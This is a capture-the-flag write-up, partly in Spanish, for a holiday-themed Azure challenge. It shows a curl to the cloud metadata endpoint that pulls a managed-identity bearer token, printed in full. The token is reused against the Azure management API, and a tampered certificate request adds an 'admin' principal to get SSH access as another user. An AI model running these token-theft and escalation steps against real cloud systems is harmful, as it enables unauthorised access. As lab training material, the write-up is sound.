```
## Certificate SSHenanigans

_Difficulty:_ 

Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure [Function App](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl). What type of cookie cache is Alabaster planning to implement?



```


```
az ssh vm --local-user monitor --hostname ssh-server-vm.santaworkshopgeeseislands.org --certificate-file cert.pub --private-key-file .ssh/id_rsa
```

- https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01

```
curl https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01

{"error":{"code":"AuthenticationFailed","message":"Authentication failed. The 'Authorization' header is missing."}}
```

- 
```
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H 'Metadata: true'
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIzNTA0NzMsIm5iZiI6MTcwMjM1MDQ3MywiZXhwIjoxNzAyNDM3MTczLCJhaW8iOiJFMlZnWUppZW5ydTZMSzU4VmsvTDFOaDRhYzU0QUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJEYlhTeEdpeEJVLTYxTXBUdHE0ekFRIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.Vm-owb7WWzZfvvKpX0eQY5_r_ftbgxctkcC46adF1gi6DTymRWsWeP3m60qkKajIJT8GoHU_l9kxmD6TVUmZOMfdAZ_O2mxMDrb1nm6Rq7uWcEhWAZxqNI1xFfY0XaxaYA2XyeqAf7b7bJu-zbj30RftCcem6sHCaP4dPaKgh7rC3yNC8Qp54XsBut8iv3EW408c0qkyIT3kdjHM9gS36gXIzrBb-vzMr6PDbhqGTrhssG_MhJy5fjqVldJqTNDrOGE3VY4su_OvfdBncaqFOnk4GfDJK_iUHKrOAE6MQNIRfCKcPK1c4SnXjCBd6PfuHlUuJXV7K2D0BCfdqgH1DA","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85947","expires_on":"1702437173","ext_expires_in":"86399","not_before":"1702350473","resource":"https://management.azure.com/","token_type":"Bearer"}monitor@ssh-serv
```

```
curl https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01 -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIzNTA0NzMsIm5iZiI6MTcwMjM1MDQ3MywiZXhwIjoxNzAyNDM3MTczLCJhaW8iOiJFMlZnWUppZW5ydTZMSzU4VmsvTDFOaDRhYzU0QUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJEYlhTeEdpeEJVLTYxTXBUdHE0ekFRIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.Vm-owb7WWzZfvvKpX0eQY5_r_ftbgxctkcC46adF1gi6DTymRWsWeP3m60qkKajIJT8GoHU_l9kxmD6TVUmZOMfdAZ_O2mxMDrb1nm6Rq7uWcEhWAZxqNI1xFfY0XaxaYA2XyeqAf7b7bJu-zbj30RftCcem6sHCaP4dPaKgh7rC3yNC8Qp54XsBut8iv3EW408c0qkyIT3kdjHM9gS36gXIzrBb-vzMr6PDbhqGTrhssG_MhJy5fjqVldJqTNDrOGE3VY4su_OvfdBncaqFOnk4GfDJK_iUHKrOAE6MQNIRfCKcPK1c4SnXjCBd6PfuHlUuJXV7K2D0BCfdqgH1DA"


{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web","name":"northpole-ssh-certs-fa","type":"Microsoft.Web/sites/sourcecontrols","location":"East US","tags":{"project":"northpole-ssh-certs","create-cert-func-url-path":"/api/create-cert?code=candy-cane-twirl"},"properties":{"repoUrl":"https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa","branch":"main","isManualIntegration":false,"isGitHubAction":true,"deploymentRollbackEnabled":false,"isMercurial":false,"provisioningState":"Succeeded","gitHubActionConfiguration":{"codeConfiguration":null,"containerConfiguration":null,"isLinux":true,"generateWorkflowFile":true,"workflowSettings":{"appType":"functionapp","publishType":"code","os":"linux","variables":{"runtimeVersion":"3.11"},"runtimeStack":"python","workflowApiVersion":"2020-12-01","useCanaryFusionServer":false,"authType":"publishprofile"}}}}


```

https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa


Obtener acceso colo alabaster debemos modificar la peticion del ceriticado agragando el principal

```
POST /api/create-cert?code=candy-cane-twirl HTTP/2
Host: northpole-ssh-certs-fa.azurewebsites.net
Content-Length: 609
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
Sec-Ch-Ua-Platform: "macOS"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://northpole-ssh-certs-fa.azurewebsites.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

{"ssh_pub_key":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDISS0p/EVbeHvbaVNZmXcsgqfvzxw/I4gqW7oNyX1An/biCmZIkgHGUmKho9NSslVyeITbAZZs8WcSoAoDSJ3biO/SlHGmkW2LkKvyWQIwXJrpYAgAhvsbdrKmJeN5TYyrXKvQqH7mukaG3ZGI+uE/Iju7Qm68Hzrkg/Z/nX+6TGgE2ZcmUb9V6ZGgEmbPN3yRqavT4lR7RPl+Fd7sF3xIK3jp+FXL8zyH7h/qNkHMSBhzZ/I51I4NFYmNx+9PTh5HbOgqdN3vRgCXLeXzTXBxUbIdswclyEYcI5OtqG8ZRdPMRpuIzUaj4z9Ln0Mcg30KCOJA556TZRcCcxPrcc/R7kpD9sWugMYMuMFKaMRyCHONsR3FHhIrGvb3Udz0/Q2idISxWVnZeLPsi78WBewYBlA4u+bDo20IC2lePi/eoV/Wn/TebLn3PV5YVLmnb3k7bujScQSG4ajy/R/oEgTkccsKXijrpstv1YylO0ycFgtfnJimDVAqM/cG2M3nszc= castr@mymac.local", "principal":"admin"}
```

Luego acceder como alabaster, con el nuevo certificado generado:

```
az ssh vm --local-user alabaster --hostname ssh-server-vm.santaworkshopgeeseislands.org --certificate-file cert3.pub --private-key-file .ssh/id_rsa

az ssh vm --local-user alabaster --hostname ssh-server-vm.santaworkshopgeeseislands.org --certificate-file cert3.pub --private-key-file .ssh/id_rsa
Last login: Thu Dec 14 22:51:46 2023 from 66.113.13.6
alabaster@ssh-server-vm:~$
alabaster@ssh-server-vm:~$
alabaster@ssh-server-vm:~$ pwd
/home/alabaster
alabaster@ssh-server-vm:~$ ls -la
total 36
drwx------ 1 alabaster alabaster 4096 Nov  9 14:07 .
drwxr-xr-x 1 root      root      4096 Nov  3 16:50 ..
-rw-r--r-- 1 alabaster alabaster  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 alabaster alabaster 3665 Nov  9 17:03 .bashrc
drwxr-xr-x 3 alabaster alabaster 4096 Nov  9 14:07 .cache
-rw-r--r-- 1 alabaster alabaster  807 Apr 23  2023 .profile
drwxr-xr-x 6 alabaster alabaster 4096 Nov  9 14:07 .venv
-rw------- 1 alabaster alabaster 1126 Nov  9 14:07 alabaster_todo.md
drwxr-xr-x 2 alabaster alabaster 4096 Nov  9 14:07 impacket
alabaster@ssh-server-vm:~$ cat alabaster_todo.md
# Geese Islands IT & Security Todo List

- [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
alabaster@ssh-server-vm:~$


```

Gingerbread  

